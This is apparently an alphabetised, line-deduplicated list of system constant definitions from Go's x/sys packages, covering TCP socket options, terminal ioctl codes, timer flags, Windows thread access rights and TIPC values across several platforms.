TCP_RACK_EARLY_SEG             = 0x424
TCP_RACK_IDLE_REDUCE_HIGH      = 0x444
TCP_RACK_MIN_PACE              = 0x445
TCP_RACK_MIN_PACE_SEG          = 0x446
TCP_RACK_MIN_TO                = 0x422
TCP_RACK_PACE_ALWAYS           = 0x41f
TCP_RACK_PACE_MAX_SEG          = 0x41e
TCP_RACK_PACE_REDUCE           = 0x41d
TCP_RACK_PKT_DELAY             = 0x428
TCP_RACK_PROP                  = 0x41b
TCP_RACK_PROP_RATE             = 0x420
TCP_RACK_PRR_SENDALOT          = 0x421
TCP_RACK_REORD_FADE            = 0x426
TCP_RACK_REORD_THRESH          = 0x425
TCP_RACK_SESS_CWV              = 0x42a
TCP_RACK_TLP_INC_VAR           = 0x429
TCP_RACK_TLP_REDUCE            = 0x41c
TCP_RACK_TLP_THRESH            = 0x427
TCP_RACK_TLP_USE               = 0x447
TCP_RECVDSTADDR               = 0x14
TCP_REPAIR                                  = 0x13
TCP_REPAIR_OFF                              = 0x0
TCP_REPAIR_OFF_NO_WP                        = -0x1
TCP_REPAIR_ON                               = 0x1
TCP_REPAIR_OPTIONS                          = 0x16
TCP_REPAIR_QUEUE                            = 0x14
TCP_REPAIR_WINDOW                           = 0x1d
TCP_RFC1323                   = 0x4
TCP_RTO_INITIAL               = 0x19
TCP_RTO_MAX                   = 0x1b
TCP_RTO_MIN                   = 0x1a
TCP_RXT_CONNDROPTIME                    = 0x80
TCP_RXT_FINDROP                         = 0x100
TCP_SACKHOLE_LIMIT                = 0x80
TCP_SACK_ENABLE                   = 0x8
TCP_SAVED_SYN                               = 0x1c
TCP_SAVE_SYN                                = 0x1b
TCP_SENDMOREACKS                        = 0x103
TCP_SETPRIV                   = 0x27
TCP_SIGNATURE_ENABLE              = 0x10
TCP_STDURG                    = 0x10
TCP_SYNCNT                                  = 0x7
TCP_S_DATA_IN                               = 0x4
TCP_S_DATA_OUT                              = 0x8
TCP_THIN_DUPACK                             = 0x11
TCP_THIN_LINEAR_TIMEOUTS                    = 0x10
TCP_TIMESTAMP                               = 0x18
TCP_TIMESTAMP_OPTLEN          = 0xc
TCP_TX_DELAY                                = 0x25
TCP_ULP                                     = 0x1f
TCP_UNSETPRIV                 = 0x28
TCP_USER_TIMEOUT                            = 0x12
TCP_USER_TIMEOUT                = 0x1
TCP_V4_FLOW                                 = 0x1
TCP_V6_FLOW                                 = 0x5
TCP_VENDOR                     = 0x80000000
TCP_WINDOW_CLAMP                            = 0xa
TCP_ZEROCOPY_RECEIVE                        = 0x23
TCSADRAIN                       = 1
TCSAFLUSH                               = 0x2
TCSAFLUSH                         = 0x2
TCSAFLUSH                        = 0x2
TCSAFLUSH                        = 0x5410
TCSAFLUSH                       = 2
TCSAFLUSH                      = 0x2
TCSAFLUSH                     = 0x2
TCSAFLUSH                     = 0x5410
TCSANOW                         = 0
TCSBRK                           = 0x20005405
TCSBRK                           = 0x2000741d
TCSBRK                           = 0x5405
TCSBRK                           = 0x5409
TCSBRK                        = 0x5405
TCSBRK                        = 0x5409
TCSBRKP                          = 0x5425
TCSBRKP                          = 0x5486
TCSET/ 
TCSETA                           = 0x5402
TCSETA                           = 0x5406
TCSETA                           = 0x80125402
TCSETA                           = 0x80147418
TCSETA                        = 0x5402
TCSETA                        = 0x5406
TCSETAF                          = 0x5404
TCSETAF                          = 0x5408
TCSETAF                          = 0x80125404
TCSETAF                          = 0x8014741c
TCSETAF                       = 0x5404
TCSETAF                       = 0x5408
TCSETAW                          = 0x5403
TCSETAW                          = 0x5407
TCSETAW                          = 0x80125403
TCSETAW                          = 0x80147419
TCSETAW                       = 0x5403
TCSETAW                       = 0x5407
TCSETS                           = 0x5402
TCSETS                           = 0x540e
TCSETS                           = 0x80245409
TCSETS                           = 0x802c7414
TCSETS                          = 0 // equivalent to TCSANOW for tcsetattr
TCSETS                        = 0x5402
TCSETS                        = 0x540e
TCSETS2                          = 0x402c542b
TCSETS2                          = 0x802c540d
TCSETS2                          = 0x8030542b
TCSETSF                          = 0x5404
TCSETSF                          = 0x5410
TCSETSF                          = 0x8024540b
TCSETSF                          = 0x802c7416
TCSETSF                         = 2 // equivalent to TCSAFLUSH for tcsetattr
TCSETSF                       = 0x5404
TCSETSF                       = 0x5410
TCSETSF2                         = 0x402c542d
TCSETSF2                         = 0x802c540f
TCSETSF2                         = 0x8030542d
TCSETSW                          = 0x5403
TCSETSW                          = 0x540f
TCSETSW                          = 0x8024540a
TCSETSW                          = 0x802c7415
TCSETSW                         = 1 // equivalent to TCSADRAIN for tcsetattr
TCSETSW                       = 0x5403
TCSETSW                       = 0x540f
TCSETSW2                         = 0x402c542c
TCSETSW2                         = 0x802c540e
TCSETSW2                         = 0x8030542c
TCSETX                           = 0x5433
TCSETXF                          = 0x5434
TCSETXW                          = 0x5435
TCXONC                           = 0x20005406
TCXONC                           = 0x2000741e
TCXONC                           = 0x5406
TCXONC                           = 0x540a
TCXONC                        = 0x5406
TCXONC                        = 0x540b
TC[IO](ON
TDMA           uint8
TEXT
TEXT 
TFD)_/ 
TFD_CLOEXEC                      = 0x400000
TFD_CLOEXEC                      = 0x80000
TFD_NONBLOCK                     = 0x4000
TFD_NONBLOCK                     = 0x80
TFD_NONBLOCK                     = 0x800
TFD_TIMER_ABSTIME                           = 0x1
TFD_TIMER_CANCEL_ON_SET                     = 0x2
TF_DISCONNECT         = 1
TF_REUSE_SOCKET       = 2
TF_USE_DEFAULT_WORKER = 0
TF_USE_KERNEL_APC     = 32
TF_USE_SYSTEM_THREAD  = 16
TF_WRITE_BEHIND       = 4
TH32CS_INHERIT      = 0x80000000
TH32CS_SNAPALL      = TH32CS_SNAPHEAPLIST 
TH32CS_SNAPHEAPLIST = 0x01
TH32CS_SNAPMODULE   = 0x08
TH32CS_SNAPMODULE32 = 0x10
TH32CS_SNAPPROCESS  = 0x02
TH32CS_SNAPTHREAD   = 0x04
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
THREAD)/ 
THREAD_DIRECT_IMPERSONATION      = 0x0200
THREAD_GET_CONTEXT               = 0x0008
THREAD_IMPERSONATE               = 0x0100
THREAD_QUERY_INFORMATION         = 0x0040
THREAD_QUERY_LIMITED_INFORMATION = 0x0800
THREAD_SET_CONTEXT               = 0x0010
THREAD_SET_INFORMATION           = 0x0020
THREAD_SET_LIMITED_INFORMATION   = 0x0400
THREAD_SET_THREAD_TOKEN          = 0x0080
THREAD_SUSPEND_RESUME            = 0x0002
THREAD_TERMINATE                 = 0x0001
TIMER)_/ 
TIMER_ABSTIME                               = 0x1
TIMER_ABSTIME                     = 0x1
TIMER_ABSTIME                  = 0x1
TIMER_ABSTIME                 = 0x1
TIMER_ABSTIME                 = 0x3e7
TIMER_ALL_ACCESS   = STANDARD_RIGHTS_REQUIRED 
TIMER_MAX                     = 0x20
TIMER_MODIFY_STATE = 0x0002
TIMER_QUERY_STATE  = 0x0001
TIMER_RELTIME                     = 0x0
TIMER_RELTIME                  = 0x0
TIMER_RELTIME                 = 0x0
TIME_BAD   = 0x5
TIME_DEL   = 0x2
TIME_ERROR = 0x5
TIME_INS   = 0x1
TIME_OK    = 0x0
TIME_OOP   = 0x3
TIME_WAIT  = 0x4
TIME_ZONE_ID_DAYLIGHT = 2
TIME_ZONE_ID_STANDARD = 1
TIME_ZONE_ID_UNKNOWN  = 0
TIOC                          = 0x5400
TIOC/ 
TIOCCBRK                                = 0x2000747a
TIOCCBRK                          = 0x2000747a
TIOCCBRK                         = 0x2000747a
TIOCCBRK                         = 0x5428
TIOCCBRK                        = 0x2000a77a
TIOCCBRK                       = 0x2000747a
TIOCCBRK                      = 0x2000747a
TIOCCBRK                      = 0x747a
TIOCCDTR                                = 0x20007478
TIOCCDTR                          = 0x20007478
TIOCCDTR                       = 0x20007478
TIOCCDTR                      = 0x20007478
TIOCCDTR                      = 0x7478
TIOCCHKVERAUTH                    = 0x2000741e
TIOCCILOOP                    = 0x746c
TIOCCLRVERAUTH                    = 0x2000741d
TIOCCONS                                = 0x80047462
TIOCCONS                          = 0x80047462
TIOCCONS                         = 0x20007424
TIOCCONS                         = 0x541d
TIOCCONS                         = 0x80047478
TIOCCONS                       = 0x80047462
TIOCCONS                      = 0x80047462
TIOCCONS                      = 0xffffffff80047462
TIOCDCDTIMESTAMP                        = 0x40107458
TIOCDCDTIMESTAMP                  = 0x400c7458
TIOCDCDTIMESTAMP                  = 0x40107458
TIOCDRAIN                               = 0x2000745e
TIOCDRAIN                         = 0x2000745e
TIOCDRAIN                      = 0x2000745e
TIOCDSIMICROCODE                        = 0x20007455
TIOCEXCL                                = 0x2000740d
TIOCEXCL                          = 0x2000740d
TIOCEXCL                         = 0x2000740d
TIOCEXCL                         = 0x540c
TIOCEXCL                         = 0x740d
TIOCEXCL                        = 0x2000a70d
TIOCEXCL                       = 0x2000740d
TIOCEXCL                      = 0x2000740d
TIOCEXCL                      = 0x740d
TIOCEXT                                 = 0x80047460
TIOCEXT                           = 0x80047460
TIOCEXT                        = 0x80047460
TIOCFLAG_CDTRCTS                  = 0x10
TIOCFLAG_CLOCAL                   = 0x2
TIOCFLAG_CRTSCTS                  = 0x4
TIOCFLAG_MDMBUF                   = 0x8
TIOCFLAG_PPS                      = 0x10
TIOCFLAG_SOFTCAR                  = 0x1
TIOCFLUSH                               = 0x80047410
TIOCFLUSH                         = 0x80047410
TIOCFLUSH                      = 0x80047410
TIOCFLUSH                     = 0x7410
TIOCFLUSH                     = 0x80047410
TIOCFLUSH                     = 0xffffffff80047410
TIOCGDEV                         = 0x40045432
TIOCGDEV                         = 0x80045432
TIOCGDRAINWAIT                          = 0x40047456
TIOCGDRAINWAIT                    = 0x40047456
TIOCGDRAINWAIT                 = 0x40047456
TIOCGETA                                = 0x40487413
TIOCGETA                          = 0x402c7413
TIOCGETA                       = 0x402c7413
TIOCGETC                         = 0x40067412
TIOCGETC                      = 0x40067412
TIOCGETC                      = 0x7412
TIOCGETD                                = 0x4004741a
TIOCGETD                          = 0x4004741a
TIOCGETD                         = 0x40047400
TIOCGETD                         = 0x5424
TIOCGETD                         = 0x7400
TIOCGETD                        = 0x4004a700
TIOCGETD                       = 0x4004741a
TIOCGETD                      = 0x40047400
TIOCGETD                      = 0x7400
TIOCGETP                         = 0x40067408
TIOCGETP                         = 0x7408
TIOCGETP                      = 0x40067408
TIOCGETP                      = 0x7408
TIOCGEXCL                        = 0x40045440
TIOCGEXCL                        = 0x80045440
TIOCGFLAGS                        = 0x4004745d
TIOCGICOUNT                      = 0x545d
TIOCGICOUNT                      = 0x5492
TIOCGISO7816                     = 0x40285442
TIOCGISO7816                     = 0x40285443
TIOCGISO7816                     = 0x80285442
TIOCGLCKTRMIOS                   = 0x5456
TIOCGLCKTRMIOS                   = 0x548b
TIOCGLINED                        = 0x40207442
TIOCGLTC                         = 0x40067474
TIOCGLTC                         = 0x7474
TIOCGLTC                      = 0x40067474
TIOCGLTC                      = 0x7474
TIOCGPGRP                               = 0x40047477
TIOCGPGRP                         = 0x40047477
TIOCGPGRP                        = 0x40047477
TIOCGPGRP                        = 0x40047483
TIOCGPGRP                        = 0x540f
TIOCGPGRP                      = 0x40047477
TIOCGPGRP                     = 0x40047477
TIOCGPGRP                     = 0x7414
TIOCGPKT                         = 0x40045438
TIOCGPKT                         = 0x80045438
TIOCGPPS                      = 0x547d
TIOCGPPSEV                    = 0x547f
TIOCGPTLCK                       = 0x40045439
TIOCGPTLCK                       = 0x80045439
TIOCGPTN                         = 0x40045430
TIOCGPTN                         = 0x40047486
TIOCGPTN                         = 0x80045430
TIOCGPTN                       = 0x4004740f
TIOCGPTPEER                      = 0x20005441
TIOCGPTPEER                      = 0x20007489
TIOCGPTPEER                      = 0x5441
TIOCGQSIZE                        = 0x40047481
TIOCGRANTPT                       = 0x20007447
TIOCGRS485                       = 0x4020542e
TIOCGRS485                       = 0x40205441
TIOCGRS485                       = 0x542e
TIOCGSERIAL                      = 0x541e
TIOCGSERIAL                      = 0x5484
TIOCGSID                          = 0x40047463
TIOCGSID                         = 0x40047485
TIOCGSID                         = 0x5429
TIOCGSID                         = 0x7416
TIOCGSID                       = 0x40047463
TIOCGSID                      = 0x40047448
TIOCGSID                      = 0x7416
TIOCGSIZE                         = 0x40087468
TIOCGSIZE                     = 0x40087468
TIOCGSOFTCAR                     = 0x40047464
TIOCGSOFTCAR                     = 0x5419
TIOCGSOFTCAR                     = 0x5481
TIOCGSOFTCAR                  = 0x5469
TIOCGTSTAMP                       = 0x400c745b
TIOCGTSTAMP                       = 0x4010745b
TIOCGWINSZ                              = 0x40087468
TIOCGWINSZ                        = 0x40087468
TIOCGWINSZ                       = 0x40087468
TIOCGWINSZ                       = 0x5413
TIOCGWINSZ                      = 0x4008a368
TIOCGWINSZ                     = 0x40087468
TIOCGWINSZ                    = 0x40087468
TIOCGWINSZ                    = 0x5468
TIOCGWINSZ = (uint32('T') << 8) 
TIOCGWINSZ = 0
TIOCGWINSZ = syscall.TIOCGWINSZ
TIOCHPCL                      = 0x20007402
TIOCHPCL                      = 0x7402
TIOCINQ                          = 0x4004667f
TIOCINQ                          = 0x467f
TIOCINQ                          = 0x541b
TIOCISPTMASTER                    = 0x20007455
TIOCIXOFF                               = 0x20007480
TIOCIXON                                = 0x20007481
TIOCKBOF                      = 0x5409
TIOCKBON                      = 0x5408
TIOCLBIC                      = 0x747e
TIOCLBIC                      = 0x8004747e
TIOCLBIC                      = 0xffffffff8004747e
TIOCLBIS                      = 0x747f
TIOCLBIS                      = 0x8004747f
TIOCLBIS                      = 0xffffffff8004747f
TIOCLGET                      = 0x4004747c
TIOCLGET                      = 0x747c
TIOCLINUX                        = 0x541c
TIOCLINUX                        = 0x5483
TIOCLSET                      = 0x747d
TIOCLSET                      = 0x8004747d
TIOCLSET                      = 0xffffffff8004747d
TIOCMBIC                                = 0x8004746b
TIOCMBIC                          = 0x8004746b
TIOCMBIC                         = 0x5417
TIOCMBIC                         = 0x741c
TIOCMBIC                         = 0x8004746b
TIOCMBIC                        = 0x8004a76b
TIOCMBIC                       = 0x8004746b
TIOCMBIC                      = 0x741c
TIOCMBIC                      = 0x8004746b
TIOCMBIC                      = 0xffffffff8004746b
TIOCMBIS                                = 0x8004746c
TIOCMBIS                          = 0x8004746c
TIOCMBIS                         = 0x5416
TIOCMBIS                         = 0x741b
TIOCMBIS                         = 0x8004746c
TIOCMBIS                        = 0x8004a76c
TIOCMBIS                       = 0x8004746c
TIOCMBIS                      = 0x741b
TIOCMBIS                      = 0x8004746c
TIOCMBIS                      = 0xffffffff8004746c
TIOCMGDTRWAIT                           = 0x4004745a
TIOCMGDTRWAIT                     = 0x4004745a
TIOCMGDTRWAIT                  = 0x4004745a
TIOCMGET                                = 0x4004746a
TIOCMGET                          = 0x4004746a
TIOCMGET                         = 0x4004746a
TIOCMGET                         = 0x5415
TIOCMGET                         = 0x741d
TIOCMGET                        = 0x4004a76a
TIOCMGET                       = 0x4004746a
TIOCMGET                      = 0x4004746a
TIOCMGET                      = 0x741d
TIOCMIWAIT                       = 0x545c
TIOCMIWAIT                       = 0x5491
TIOCMIWAIT                    = 0x80047464
TIOCMIWAIT                    = 0xffffffff80047464
TIOCMODG                                = 0x40047403
TIOCMODG                          = 0x40047403
TIOCMODG                          = 0x4004746a
TIOCMODG                      = 0x40047403
TIOCMODS                                = 0x80047404
TIOCMODS                          = 0x80047404
TIOCMODS                          = 0x8004746d
TIOCMODS                      = 0x80047404
TIOCMODS                      = 0xffffffff80047404
TIOCMSDTRWAIT                           = 0x8004745b
TIOCMSDTRWAIT                     = 0x8004745b
TIOCMSDTRWAIT                  = 0x8004745b
TIOCMSET                                = 0x8004746d
TIOCMSET                          = 0x8004746d
TIOCMSET                         = 0x5418
TIOCMSET                         = 0x741a
TIOCMSET                         = 0x8004746d
TIOCMSET                        = 0x8004a76d
TIOCMSET                       = 0x8004746d
TIOCMSET                      = 0x741a
TIOCMSET                      = 0x8004746d
TIOCMSET                      = 0xffffffff8004746d
TIOCM_CAR                               = 0x40
TIOCM_CAR                         = 0x40
TIOCM_CAR                        = 0x100
TIOCM_CAR                        = 0x40
TIOCM_CAR                      = 0x40
TIOCM_CAR                     = 0x40
TIOCM_CD                                = 0x40
TIOCM_CD                          = 0x40
TIOCM_CD                         = 0x100
TIOCM_CD                         = 0x40
TIOCM_CD                       = 0x40
TIOCM_CD                      = 0x40
TIOCM_CTS                               = 0x20
TIOCM_CTS                         = 0x20
TIOCM_CTS                        = 0x20
TIOCM_CTS                        = 0x40
TIOCM_CTS                      = 0x20
TIOCM_CTS                     = 0x20
TIOCM_DCD                      = 0x40
TIOCM_DSR                               = 0x100
TIOCM_DSR                         = 0x100
TIOCM_DSR                        = 0x100
TIOCM_DSR                        = 0x400
TIOCM_DSR                      = 0x100
TIOCM_DSR                     = 0x100
TIOCM_DTR                                   = 0x2
TIOCM_DTR                               = 0x2
TIOCM_DTR                         = 0x2
TIOCM_DTR                      = 0x2
TIOCM_DTR                     = 0x2
TIOCM_LE                                    = 0x1
TIOCM_LE                                = 0x1
TIOCM_LE                          = 0x1
TIOCM_LE                       = 0x1
TIOCM_LE                      = 0x1
TIOCM_LOOP                       = 0x8000
TIOCM_OUT1                       = 0x2000
TIOCM_OUT2                       = 0x4000
TIOCM_RI                                = 0x80
TIOCM_RI                          = 0x80
TIOCM_RI                         = 0x200
TIOCM_RI                         = 0x80
TIOCM_RI                       = 0x80
TIOCM_RI                      = 0x80
TIOCM_RNG                               = 0x80
TIOCM_RNG                         = 0x80
TIOCM_RNG                        = 0x200
TIOCM_RNG                        = 0x80
TIOCM_RNG                      = 0x80
TIOCM_RNG                     = 0x80
TIOCM_RTS                                   = 0x4
TIOCM_RTS                               = 0x4
TIOCM_RTS                         = 0x4
TIOCM_RTS                      = 0x4
TIOCM_RTS                     = 0x4
TIOCM_SR                                = 0x10
TIOCM_SR                          = 0x10
TIOCM_SR                         = 0x10
TIOCM_SR                         = 0x20
TIOCM_SR                       = 0x10
TIOCM_SR                      = 0x10
TIOCM_ST                                = 0x8
TIOCM_ST                          = 0x8
TIOCM_ST                         = 0x10
TIOCM_ST                         = 0x8
TIOCM_ST                       = 0x8
TIOCM_ST                      = 0x8
TIOCNOTTY                               = 0x20007471
TIOCNOTTY                         = 0x20007471
TIOCNOTTY                        = 0x20007471
TIOCNOTTY                        = 0x5422
TIOCNOTTY                        = 0x5471
TIOCNOTTY                       = 0x2000a771
TIOCNOTTY                      = 0x20007471
TIOCNOTTY                     = 0x20007471
TIOCNOTTY                     = 0x7471
TIOCNXCL                                = 0x2000740e
TIOCNXCL                          = 0x2000740e
TIOCNXCL                         = 0x2000740e
TIOCNXCL                         = 0x540d
TIOCNXCL                         = 0x740e
TIOCNXCL                        = 0x2000a70e
TIOCNXCL                       = 0x2000740e
TIOCNXCL                      = 0x2000740e
TIOCNXCL                      = 0x740e
TIOCOUTQ                                = 0x40047473
TIOCOUTQ                          = 0x40047473
TIOCOUTQ                         = 0x40047473
TIOCOUTQ                         = 0x5411
TIOCOUTQ                         = 0x7472
TIOCOUTQ                       = 0x40047473
TIOCOUTQ                      = 0x40047473
TIOCOUTQ                      = 0x7473
TIOCPKT                                 = 0x80047470
TIOCPKT                           = 0x80047470
TIOCPKT                          = 0x5420
TIOCPKT                          = 0x5470
TIOCPKT                          = 0x80047470
TIOCPKT                         = 0x8004a770
TIOCPKT                        = 0x80047470
TIOCPKT                       = 0x80047470
TIOCPKT                       = 0xffffffff80047470
TIOCPKT_DATA                                = 0x0
TIOCPKT_DATA                            = 0x0
TIOCPKT_DATA                      = 0x0
TIOCPKT_DATA                   = 0x0
TIOCPKT_DATA                  = 0x0
TIOCPKT_DOSTOP                              = 0x20
TIOCPKT_DOSTOP                          = 0x20
TIOCPKT_DOSTOP                    = 0x20
TIOCPKT_DOSTOP                 = 0x20
TIOCPKT_DOSTOP                = 0x20
TIOCPKT_FLUSHREAD                           = 0x1
TIOCPKT_FLUSHREAD                       = 0x1
TIOCPKT_FLUSHREAD                 = 0x1
TIOCPKT_FLUSHREAD              = 0x1
TIOCPKT_FLUSHREAD             = 0x1
TIOCPKT_FLUSHWRITE                          = 0x2
TIOCPKT_FLUSHWRITE                      = 0x2
TIOCPKT_FLUSHWRITE                = 0x2
TIOCPKT_FLUSHWRITE             = 0x2
TIOCPKT_FLUSHWRITE            = 0x2
TIOCPKT_IOCTL                               = 0x40
TIOCPKT_IOCTL                           = 0x40
TIOCPKT_IOCTL                     = 0x40
TIOCPKT_IOCTL                  = 0x40
TIOCPKT_NOSTOP                              = 0x10
TIOCPKT_NOSTOP                          = 0x10
TIOCPKT_NOSTOP                    = 0x10
TIOCPKT_NOSTOP                 = 0x10
TIOCPKT_NOSTOP                = 0x10
TIOCPKT_START                               = 0x8
TIOCPKT_START                           = 0x8
TIOCPKT_START                     = 0x8
TIOCPKT_START                  = 0x8
TIOCPKT_START                 = 0x8
TIOCPKT_STOP                                = 0x4
TIOCPKT_STOP                            = 0x4
TIOCPKT_STOP                      = 0x4
TIOCPKT_STOP                   = 0x4
TIOCPKT_STOP                  = 0x4
TIOCPTMASTER                   = 0x2000741c
TIOCPTMGET                        = 0x40287446
TIOCPTMGET                        = 0x48087446
TIOCPTSNAME                       = 0x40287448
TIOCPTSNAME                       = 0x48087448
TIOCPTYGNAME                            = 0x40807453
TIOCPTYGRANT                            = 0x20007454
TIOCPTYUNLK                             = 0x20007452
TIOCRCVFRAME                      = 0x80047445
TIOCRCVFRAME                      = 0x80087445
TIOCREMOTE                              = 0x80047469
TIOCREMOTE                        = 0x80047469
TIOCREMOTE                      = 0x8004a769
TIOCREMOTE                    = 0x741e
TIOCREMOTE                    = 0x80047469
TIOCREMOTE                    = 0xffffffff80047469
TIOCSBRK                                = 0x2000747b
TIOCSBRK                          = 0x2000747b
TIOCSBRK                         = 0x2000747b
TIOCSBRK                         = 0x5427
TIOCSBRK                        = 0x2000a77b
TIOCSBRK                       = 0x2000747b
TIOCSBRK                      = 0x2000747b
TIOCSBRK                      = 0x747b
TIOCSCONS                               = 0x20007463
TIOCSCTTY                               = 0x20007461
TIOCSCTTY                         = 0x20007461
TIOCSCTTY                        = 0x20007484
TIOCSCTTY                        = 0x540e
TIOCSCTTY                        = 0x5480
TIOCSCTTY                      = 0x20007461
TIOCSCTTY                     = 0x7484
TIOCSDRAINWAIT                          = 0x80047457
TIOCSDRAINWAIT                    = 0x80047457
TIOCSDRAINWAIT                 = 0x80047457
TIOCSDTR                                = 0x20007479
TIOCSDTR                          = 0x20007479
TIOCSDTR                       = 0x20007479
TIOCSDTR                      = 0x20007479
TIOCSDTR                      = 0x7479
TIOCSERCONFIG                    = 0x5453
TIOCSERCONFIG                    = 0x5488
TIOCSERGETLSR                    = 0x5459
TIOCSERGETLSR                    = 0x548e
TIOCSERGETMULTI                  = 0x545a
TIOCSERGETMULTI                  = 0x548f
TIOCSERGSTRUCT                   = 0x5458
TIOCSERGSTRUCT                   = 0x548d
TIOCSERGWILD                     = 0x5454
TIOCSERGWILD                     = 0x5489
TIOCSERSETMULTI                  = 0x545b
TIOCSERSETMULTI                  = 0x5490
TIOCSERSWILD                     = 0x5455
TIOCSERSWILD                     = 0x548a
TIOCSER_TEMT                     = 0x1
TIOCSETA                                = 0x80487414
TIOCSETA                          = 0x802c7414
TIOCSETA                       = 0x802c7414
TIOCSETAF                               = 0x80487416
TIOCSETAF                         = 0x802c7416
TIOCSETAF                      = 0x802c7416
TIOCSETAW                               = 0x80487415
TIOCSETAW                         = 0x802c7415
TIOCSETAW                      = 0x802c7415
TIOCSETC                         = 0x80067411
TIOCSETC                      = 0x7411
TIOCSETC                      = 0x80067411
TIOCSETC                      = 0xffffffff80067411
TIOCSETD                                = 0x8004741b
TIOCSETD                          = 0x8004741b
TIOCSETD                         = 0x5423
TIOCSETD                         = 0x7401
TIOCSETD                         = 0x80047401
TIOCSETD                        = 0x8004a701
TIOCSETD                       = 0x8004741b
TIOCSETD                      = 0x7401
TIOCSETD                      = 0x80047401
TIOCSETD                      = 0xffffffff80047401
TIOCSETN                         = 0x740a
TIOCSETN                         = 0x8006740a
TIOCSETN                      = 0x740a
TIOCSETN                      = 0x8006740a
TIOCSETN                      = 0xffffffff8006740a
TIOCSETP                         = 0x7409
TIOCSETP                         = 0x80067409
TIOCSETP                      = 0x7409
TIOCSETP                      = 0x80067409
TIOCSETP                      = 0xffffffff80067409
TIOCSETVERAUTH                    = 0x8004741c
TIOCSFLAGS                        = 0x8004745c
TIOCSIG                                 = 0x2000745f
TIOCSIG                           = 0x2000745f
TIOCSIG                           = 0x8004745f
TIOCSIG                          = 0x40045436
TIOCSIG                          = 0x80045436
TIOCSIG                          = 0x80047488
TIOCSIG                        = 0x2004745f
TIOCSIGNAL                    = 0x741f
TIOCSILOOP                    = 0x746d
TIOCSISO7816                     = 0xc0285443
TIOCSISO7816                     = 0xc0285444
TIOCSLCKTRMIOS                   = 0x5457
TIOCSLCKTRMIOS                   = 0x548c
TIOCSLINED                        = 0x80207443
TIOCSLTC                         = 0x7475
TIOCSLTC                         = 0x80067475
TIOCSLTC                      = 0x7475
TIOCSLTC                      = 0x80067475
TIOCSLTC                      = 0xffffffff80067475
TIOCSPGRP                               = 0x80047476
TIOCSPGRP                         = 0x80047476
TIOCSPGRP                        = 0x5410
TIOCSPGRP                        = 0x80047476
TIOCSPGRP                        = 0x80047482
TIOCSPGRP                       = 0x8004a776
TIOCSPGRP                      = 0x80047476
TIOCSPGRP                     = 0x7415
TIOCSPGRP                     = 0x80047476
TIOCSPGRP                     = 0xffffffff80047476
TIOCSPPS                      = 0x547e
TIOCSPTLCK                       = 0x40045431
TIOCSPTLCK                       = 0x80045431
TIOCSPTLCK                       = 0x80047487
TIOCSQSIZE                        = 0x80047480
TIOCSRS485                       = 0x542f
TIOCSRS485                       = 0xc020542f
TIOCSRS485                       = 0xc0205442
TIOCSSERIAL                      = 0x541f
TIOCSSERIAL                      = 0x5485
TIOCSSIZE                         = 0x80087467
TIOCSSIZE                     = 0x80087467
TIOCSSIZE                     = 0xffffffff80087467
TIOCSSOFTCAR                     = 0x541a
TIOCSSOFTCAR                     = 0x5482
TIOCSSOFTCAR                     = 0x80047465
TIOCSSOFTCAR                  = 0x546a
TIOCSTART                               = 0x2000746e
TIOCSTART                         = 0x2000746e
TIOCSTART                        = 0x2000746e
TIOCSTART                       = 0x2000a76e
TIOCSTART                      = 0x2000746e
TIOCSTART                     = 0x2000746e
TIOCSTART                     = 0x746e
TIOCSTAT                                = 0x20007465
TIOCSTAT                          = 0x20007465
TIOCSTAT                          = 0x80047465
TIOCSTAT                       = 0x20007465
TIOCSTI                                 = 0x80017472
TIOCSTI                           = 0x80017472
TIOCSTI                          = 0x5412
TIOCSTI                          = 0x5472
TIOCSTI                          = 0x80017472
TIOCSTI                         = 0x8001a772
TIOCSTI                        = 0x80017472
TIOCSTI                       = 0x7417
TIOCSTI                       = 0x80017472
TIOCSTI                       = 0xffffffff80017472
TIOCSTOP                                = 0x2000746f
TIOCSTOP                          = 0x2000746f
TIOCSTOP                         = 0x2000746f
TIOCSTOP                        = 0x2000a76f
TIOCSTOP                       = 0x2000746f
TIOCSTOP                      = 0x2000746f
TIOCSTOP                      = 0x746f
TIOCSTSTAMP                       = 0x8008745a
TIOCSWINSZ                              = 0x80087467
TIOCSWINSZ                        = 0x80087467
TIOCSWINSZ                       = 0x5414
TIOCSWINSZ                       = 0x80087467
TIOCSWINSZ                      = 0x8008a367
TIOCSWINSZ                     = 0x80087467
TIOCSWINSZ                    = 0x5467
TIOCSWINSZ                    = 0x80087467
TIOCSWINSZ                    = 0xffffffff80087467
TIOCSWINSZ = (uint32('T') << 8) 
TIOCSWINSZ = 0
TIOCSWINSZ = syscall.TIOCSWINSZ
TIOCTIMESTAMP                           = 0x40107459
TIOCTIMESTAMP                     = 0x40107459
TIOCTIMESTAMP                  = 0x40087459
TIOCTIMESTAMP                  = 0x40107459
TIOCUCNTL                               = 0x80047466
TIOCUCNTL                         = 0x80047466
TIOCUCNTL                       = 0x8004a766
TIOCUCNTL                      = 0x80047466
TIOCUCNTL                     = 0x80047466
TIOCUCNTL                     = 0xffffffff80047466
TIOCUCNTL_CBRK                    = 0x7a
TIOCUCNTL_SBRK                    = 0x7b
TIOCVHANGUP                      = 0x20005437
TIOCVHANGUP                      = 0x5437
TIOCXMTFRAME                      = 0x80047444
TIOCXMTFRAME                      = 0x80087444
TIPCServiceName) tipcAddr() [12]byte {
TIPCServiceName) tipcAddrtype() uint8 { return TIPC_SERVICE_ADDR }
TIPCServiceName)(unsafe.Pointer(
TIPCServiceName.
TIPCServiceRange) tipcAddr() [12]byte {
TIPCServiceRange) tipcAddrtype() uint8 { return TIPC_SERVICE_RANGE }
TIPCServiceRange)(unsafe.Pointer(
TIPCSocketAddr) tipcAddr() [12]byte {
TIPCSocketAddr) tipcAddrtype() uint8 { return TIPC_SOCKET_ADDR }
TIPCSocketAddr)(unsafe.Pointer(
TIPC_/ 
TIPC_ADDR_ID                                = 0x3
TIPC_ADDR_MCAST                             = 0x1
TIPC_ADDR_NAME                              = 0x2
TIPC_ADDR_NAMESEQ                           = 0x1
TIPC_AEAD_ALG_NAME                          = 0x20
TIPC_AEAD_KEYLEN_MAX                        = 0x24
TIPC_AEAD_KEYLEN_MIN                        = 0x14
TIPC_AEAD_KEY_SIZE_MAX                      = 0x48
TIPC_CFG_SRV                                = 0x0
TIPC_CLUSTER_BITS                           = 0xc
TIPC_CLUSTER_MASK                           = 0xfff000
TIPC_CLUSTER_OFFSET                         = 0xc
TIPC_CLUSTER_SCOPE = 0x2
TIPC_CLUSTER_SIZE                           = 0xfff
